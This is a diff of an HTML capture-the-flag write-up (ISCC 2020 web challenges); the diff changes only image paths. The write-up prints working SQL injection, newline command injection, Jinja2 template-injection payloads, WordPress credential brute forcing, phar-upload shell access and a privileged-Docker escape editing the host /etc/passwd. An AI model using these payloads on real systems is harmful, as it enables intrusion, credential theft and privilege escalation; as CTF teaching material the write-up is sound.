-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200521111107265.png" alt="image-20200521111107265"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200521111107265.png" alt="image-20200521111107265"></p>
 <p><code>inc</code>目录存放的是配置文件和功能函数文件</p>
 <pre><code>Index of /inc
 [ICO]    Name    Last modified    Size    Description
@@ -1531,26 +1531,26 @@ Array
 [   ]    function.php    2020-04-28 12:44    7.1K     
 [   ]    mysql.inc.php    2020-05-07 02:46    1.0K     
 Apache/2.4.29 (Ubuntu) Server at 101.201.126.95 Port 7007</code></pre><p>接着访问<code>flag.php</code>，发现存在跳转，使用bp拦截数据包</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200521175708209.png" alt="image-20200521175708209"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200521175708209.png" alt="image-20200521175708209"></p>
 <p>根据返回的数据包提示注入字段<code>name</code></p>
 <p>经过注入测试发现存在时间盲注，但是过滤了空格（这里使用注释符绕过）</p>
 <p>payload（这里禁用JS之后再进行测试，避免跳转到index.php界面）</p>
-<pre><code>1&#39;/**/AND/**/(SELECT/**/6/**/FROM/**/(SELECT(SLEEP(5)))B)#</code></pre><p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200521221417857.png" alt="image-20200521221417857"></p>
+<pre><code>1&#39;/**/AND/**/(SELECT/**/6/**/FROM/**/(SELECT(SLEEP(5)))B)#</code></pre><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200521221417857.png" alt="image-20200521221417857"></p>
 <p>知道注入规则之后，直接使用SQLMAP添加tamper脚本进行自动化攻击利用</p>
-<pre><code>sqlmap -u &quot;http://101.201.126.95:7007/flag.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --tamper=space2comment -D pikachu -T flag -C &quot;flag&quot; --dump</code></pre><p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200521221631489.png" alt="image-20200521221631489"></p>
+<pre><code>sqlmap -u &quot;http://101.201.126.95:7007/flag.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --tamper=space2comment -D pikachu -T flag -C &quot;flag&quot; --dump</code></pre><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200521221631489.png" alt="image-20200521221631489"></p>
 <p>得到MD5进行解密</p>
 <pre><code>ciphertext：67d4e5f7ee18967a612a5eb8dcda020a
 
 plaintext：sixsixsix
 
-flag{sixsixsix}</code></pre><h2 id="成绩查询-3"><a href="#成绩查询-3" class="headerlink" title="成绩查询-3"></a>成绩查询-3</h2><p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200515230224285.png" alt="image-20200515230224285"></p>
+flag{sixsixsix}</code></pre><h2 id="成绩查询-3"><a href="#成绩查询-3" class="headerlink" title="成绩查询-3"></a>成绩查询-3</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200515230224285.png" alt="image-20200515230224285"></p>
 <p>考点：密码算法</p>
 <p>题目打开如下</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200520234258267.png" alt="image-20200520234258267"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200520234258267.png" alt="image-20200520234258267"></p>
 <p>可以看到这是一串base64编码的字符串，但是解码之后是乱码</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200520234448930.png" alt="image-20200520234448930"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200520234448930.png" alt="image-20200520234448930"></p>
 <p>可以猜测该字符串在base64编码之前可能进行过其它算法的的处理（一般算法加密的数据最后都会进行base64编码存储，避免特殊字符的影响），下来对网站进行敏感信息的收集，发现并未存在其它目录文件的泄露，但是网站主页的源代码里存在注释的源码敏感信息</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200520234748791.png" alt="image-20200520234748791"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200520234748791.png" alt="image-20200520234748791"></p>
 <p>从代码可以看出这是一个加密算法，也就验证了主页显示的一串字符串正是由该算法加密处理后的结果。</p>
 <p>既然知道了加密算法，就可以很容易的推出解密算法来，但是要想解密这段特殊字符串必须知道密钥key，由于前面的敏感信息收集并没有发现key的泄露，所以根据题目的关联性，回到上一关<code>ISCC成绩查询_2</code>（一般上一关flag会是下一关解题的一部分）寻找是否存在key，因为上一关注入得到的flag为<code>flag{sixsixsix}</code>，所以猜测key可能取值为<code>sixsixsix 或 666</code>，知道密钥key之后剩下的就是由加密算法编写解密算法，解密算法如下：</p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
@@ -1589,12 +1589,12 @@ flag{sixsixsix}</code></pre><h2 id="成绩查询-3"><a href="#成绩查询-3" cl
 
 <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>解密数据<code>qKe4j6uFeqaTe5rVqqaXiKig25o=</code></p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200521000848535.png" alt="image-20200521000848535"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200521000848535.png" alt="image-20200521000848535"></p>
 <p>从结果可以看到密钥key为<code>666</code>，解密结果为<code>BFS_ISCC_First_Prize</code></p>
-<pre><code>flag{BFS_ISCC_First_Prize}</code></pre><h2 id="神秘组织的邮件-2"><a href="#神秘组织的邮件-2" class="headerlink" title="神秘组织的邮件-2"></a>神秘组织的邮件-2</h2><p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200515230121671.png" alt="image-20200515230121671"></p>
+<pre><code>flag{BFS_ISCC_First_Prize}</code></pre><h2 id="神秘组织的邮件-2"><a href="#神秘组织的邮件-2" class="headerlink" title="神秘组织的邮件-2"></a>神秘组织的邮件-2</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200515230121671.png" alt="image-20200515230121671"></p>
 <p>考点：脚本编写、代码审计</p>
 <p>题目打开有一串数字字符还有一个提交按钮</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200525183757391.png" alt="image-20200525183757391"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200525183757391.png" alt="image-20200525183757391"></p>
 <p>看数字和Result提交，猜测是计算上面的四个数然后提交结果，但是应该是什么样的四则运算呢？？依据上一题<code>神秘组织的邮件-1</code>解出的flag提示进行解题：<code>flag{加减乘除}</code></p>
 <p>知道表达式的运算规则之后，编写脚本进行测试利用</p>
 <pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> re
@@ -1619,7 +1619,7 @@ res <span class="token operator">=</span> r<span class="token punctuation">.</sp
 <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>运行脚本得到页面的其它回显信息</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200525222556450.png" alt="image-20200525222556450"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200525222556450.png" alt="image-20200525222556450"></p>
 <pre class="line-numbers language-html"><code class="language-html">34685+95037-7*786/2
 126971.0
 
@@ -1645,8 +1645,8 @@ res <span class="token operator">=</span> r<span class="token punctuation">.</sp
 <p>base64编码字符串<code>flag.php</code> –&gt;&gt; <code>ZmxhZy5waHA=</code></p>
 <p>继续回到主页面，提交<code>ZmxhZy5waHA=</code>，可是发现页面并没有跳转到<code>./flag.php</code>，猜测存在过滤，对<code>ZmxhZy5waHA=</code>进行改写绕过过滤：<code>Z&#39;m&#39;x&#39;h&#39;Z&#39;y&#39;5&#39;w&#39;a&#39;H&#39;A&#39;=</code></p>
 <p>回到主页面提交特定字符串跳转到<code>./flag.php</code>得到flag</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200525185702033.png" alt="image-20200525185702033"></p>
-<pre><code>flag{welcomekenan{toiscc}}</code></pre><h2 id="阿帅的爱情"><a href="#阿帅的爱情" class="headerlink" title="阿帅的爱情"></a>阿帅的爱情</h2><p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200520160615240.png" alt="image-20200520160615240"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200525185702033.png" alt="image-20200525185702033"></p>
+<pre><code>flag{welcomekenan{toiscc}}</code></pre><h2 id="阿帅的爱情"><a href="#阿帅的爱情" class="headerlink" title="阿帅的爱情"></a>阿帅的爱情</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200520160615240.png" alt="image-20200520160615240"></p>
 <p>考点：命令注入</p>
 <p>题目直接给了源码让进行审计，如下：</p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
@@ -1670,19 +1670,19 @@ res <span class="token operator">=</span> r<span class="token punctuation">.</sp
     <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>审计可得变量<code>ip</code>存在注入，但是代码对<code>ip</code>变量进行了特殊字符与字母的过滤</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200520232134129.png" alt="image-20200520232134129"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200520232134129.png" alt="image-20200520232134129"></p>
 <p>这里因为是<code>shell_exec</code>函数并且正则对特殊字符进行了过滤，所以可以使用换行符<code>%0a</code>进行截断绕过限制</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200520232431767.png" alt="image-20200520232431767"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200520232431767.png" alt="image-20200520232431767"></p>
 <p>通过审计绕过限制之后直接命令注入执行读取flag文件</p>
-<pre><code>?ip=127.0.0.1 %0acat flag.php</code></pre><p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200520232802167.png" alt="image-20200520232802167"></p>
-<pre><code>flag{6Zi/5qOu5LiK5LqG6Zi_5biF77yM5Zyo5LiA5Liq5rKh5py_J5pif5pif55qE5aSc5pma}</code></pre><h1 id="擂台题-Web"><a href="#擂台题-Web" class="headerlink" title="擂台题-Web"></a>擂台题-Web</h1><h2 id="Easy-Injection"><a href="#Easy-Injection" class="headerlink" title="Easy Injection"></a>Easy Injection</h2><p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200501184412559.png" alt="image-20200501184412559"></p>
+<pre><code>?ip=127.0.0.1 %0acat flag.php</code></pre><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200520232802167.png" alt="image-20200520232802167"></p>
+<pre><code>flag{6Zi/5qOu5LiK5LqG6Zi_5biF77yM5Zyo5LiA5Liq5rKh5py_J5pif5pif55qE5aSc5pma}</code></pre><h1 id="擂台题-Web"><a href="#擂台题-Web" class="headerlink" title="擂台题-Web"></a>擂台题-Web</h1><h2 id="Easy-Injection"><a href="#Easy-Injection" class="headerlink" title="Easy Injection"></a>Easy Injection</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501184412559.png" alt="image-20200501184412559"></p>
 <p>考点：jinja2模板注入</p>
 <p>题目提示python模板注入</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200501175913738.png" alt="image-20200501175913738"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501175913738.png" alt="image-20200501175913738"></p>
 <p>典型的模板注入案例，没有过滤，直接构造利用payload</p>
 <pre><code>http://101.201.126.95:7050/{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /usr/src/app/flog').read()") }}{% endif %}{% endfor %}
 
-http://101.201.126.95:7050/{{ config.__class__.__init__.__globals__['os'].popen('cat flog').read() }}</code></pre><p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200501175759627.png" alt="image-20200501175759627"></p>
+http://101.201.126.95:7050/{{ config.__class__.__init__.__globals__['os'].popen('cat flog').read() }}</code></pre><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200501175759627.png" alt="image-20200501175759627"></p>
 <p><strong>附题目源码</strong></p>
 <ul>
 <li>index.py</li>
@@ -1702,10 +1702,10 @@ app <span class="token operator">=</span> Flask<span class="token punctuation">(
 
 <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
     app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="简简单单，干掉WP"><a href="#简简单单，干掉WP" class="headerlink" title="简简单单，干掉WP"></a>简简单单，干掉WP</h2><p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200508211808736.png" alt="image-20200508211808736"></p>
+<h2 id="简简单单，干掉WP"><a href="#简简单单，干掉WP" class="headerlink" title="简简单单，干掉WP"></a>简简单单，干掉WP</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200508211808736.png" alt="image-20200508211808736"></p>
 <p>考点：渗透测试</p>
 <p>题目打开是一个大家所熟悉的CMS框架Wordpress站点</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200525134455310.png" alt="image-20200525134455310"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200525134455310.png" alt="image-20200525134455310"></p>
 <p>先查看WP版本：访问<code>readme.html</code>或使用<code>wpscan</code>进行扫描探测</p>
 <pre><code> → Qftm :~/Desktop# wpscan --url http://94.191.116.98:64555/
 _______________________________________________________________
@@ -1810,7 +1810,7 @@ Interesting Finding(s):
 [+] Memory used: 178.301 MB
 [+] Elapsed time: 00:03:44
 </code></pre><p>访问<code>http://94.191.116.98:64555/robots.txt</code>得到后台页面</p>
-<pre><code>http://94.191.116.98:64555/wp-login.php</code></pre><p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200525135515352.png" alt="image-20200525135515352"></p>
+<pre><code>http://94.191.116.98:64555/wp-login.php</code></pre><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200525135515352.png" alt="image-20200525135515352"></p>
 <p>想办法登录网站，使用<code>wpscan</code>探测网站有哪些用户</p>
 <pre><code>wpscan --url http://94.191.116.98:64555 -e u</code></pre><pre><code>[i] User(s) Identified:
 
@@ -1828,7 +1828,7 @@ Interesting Finding(s):
  | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
  | Confirmed By: Login Error Messages (Aggressive Detection)</code></pre><p>探测到存在<code>admin和jerry</code>两个网站用户，将用户存储在文件<code>user</code>中</p>
 <p>下来使用<code>cewl</code>根据网站生成破解密码<code>pass</code></p>
-<pre><code>cewl http://94.191.116.98:64555/ -w pass</code></pre><p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200525140426163.png" alt="image-20200525140426163"></p>
+<pre><code>cewl http://94.191.116.98:64555/ -w pass</code></pre><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200525140426163.png" alt="image-20200525140426163"></p>
 <p>通过<code>wpscan</code>利用生成的user和pass两个文件进行破解验证后台</p>
 <pre><code>wpscan --url http://94.191.116.98:64555 -U user -P pass</code></pre><pre><code>[+] Enumerating Config Backups (via Passive and Aggressive Methods)
  Checking Config Backups - Time: 00:00:00 &lt;===============================&gt; (21 / 21) 100.00% Time: 00:00:00
@@ -1842,11 +1842,11 @@ Trying admin / Author Time: 00:00:02 &lt;==================================&gt; 
 [i] Valid Combinations Found:
  | Username: jerry, Password: egIsNNNnotHe</code></pre><p>验证结果得到网站后台一组用户名和密码</p>
 <pre><code>Username: jerry, Password: egIsNNNnotHe</code></pre><p>使用得到的账户名和密码登录后台，拿到flag</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200525140852543.png" alt="image-20200525140852543"></p>
-<pre><code>flag{wEak_pAsS_1s_deNge20us}</code></pre><h2 id="大黑阔"><a href="#大黑阔" class="headerlink" title="大黑阔"></a>大黑阔</h2><p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200524205322406.png" alt="image-20200524205322406"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200525140852543.png" alt="image-20200525140852543"></p>
+<pre><code>flag{wEak_pAsS_1s_deNge20us}</code></pre><h2 id="大黑阔"><a href="#大黑阔" class="headerlink" title="大黑阔"></a>大黑阔</h2><p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200524205322406.png" alt="image-20200524205322406"></p>
 <p>考点：phar反序列化、Docker逃逸提权</p>
 <p>题目上来就是一个上传界面，不用说就有过滤【只能上传gif】，对网站进行敏感信息收集</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200524205700064.png" alt="image-20200524205700064"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200524205700064.png" alt="image-20200524205700064"></p>
 <p>泄露网站源码<code>www.zip</code>，下载源码</p>
 <p>upload.php</p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
@@ -1912,9 +1912,9 @@ Trying admin / Author Time: 00:00:02 &lt;==================================&gt; 
 00000080  BE B7 E8 B6  01 00 00 00   00 00 00 61  98 14 3A DC  ...........a..:.
 00000090  67 2A 62 13  5F C6 2F 99   A8 27 BA 44  F5 32 B3 5F  g*b._./..&#39;.D.2._
 000000A0  02 00 00 00  47 42 4D 42                             ....GBMB </code></pre><p>对于本地生成的phar文件，依据上传限制，直接更改phar文件后缀为gif，上传phar.gif直接Getshell</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200524213347383.png" alt="image-20200524213347383"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200524213347383.png" alt="image-20200524213347383"></p>
 <p>在服务器上没有找到flag，可能权限不够，由于服务器上开着docker，并且www用户可以直接操作docker的部署</p>
-<p><img src="/2020/05/26/iscc-2020-web-writeup/image-20200524214010529.png" alt="image-20200524214010529"></p>
+<p><img src="/2020/05/26/ISCC_2020_Web_WriteUp/image-20200524214010529.png" alt="image-20200524214010529"></p>
 <p>下来直接利用docker启动特权容器或者cap-add=SYS_ADMIN（或映射宿主机文件到容器中）</p>
 <pre><code>docker run -it --privileged=true ubuntu /bin/bash</code></pre><p>此时docker容器具有mount权限，进入容器挂载宿主机目录到容器中，修改宿主机的<code>/etc/passwd</code>进行提取得到flag</p>
 <pre><code>flag{Nobody_knows_Hackuoer_better_than_me}</code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>不谈ISCC赛制怎么样，对于不同阶段的人也是有一定的学习和提高。</p>
@@ -1943,7 +1943,7 @@ Trying admin / Author Time: 00:00:02 &lt;==================================&gt; 
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Qftm.github.io/2020/05/26/iscc-2020-web-writeup/">http://Qftm.github.io/2020/05/26/iscc-2020-web-writeup/</a>
+                    <a href="http://Qftm.github.io/2020/05/26/ISCC_2020_Web_WriteUp/">http://Qftm.github.io/2020/05/26/ISCC_2020_Web_WriteUp/</a>
                 </span>
             </div>
             <div class="reprint__notice">
